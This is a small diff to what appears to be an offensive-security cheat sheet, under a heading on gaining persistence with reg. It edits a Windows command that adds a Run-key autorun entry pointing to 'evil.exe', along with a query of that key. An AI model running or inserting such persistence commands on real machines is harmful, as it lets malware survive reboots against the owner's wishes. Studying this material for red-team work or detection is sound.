@@ -167,8 +167,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Enab
 ### Gain persistence with reg
 
 ```
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v BadGuy /t REG_SZ /d "C:\Users\Victim\evil.exe"
-reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v BadGuy /t REG_SZ /d "C:\Users\Victim\evil.exe"
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
 ```
 
 ## Useful links
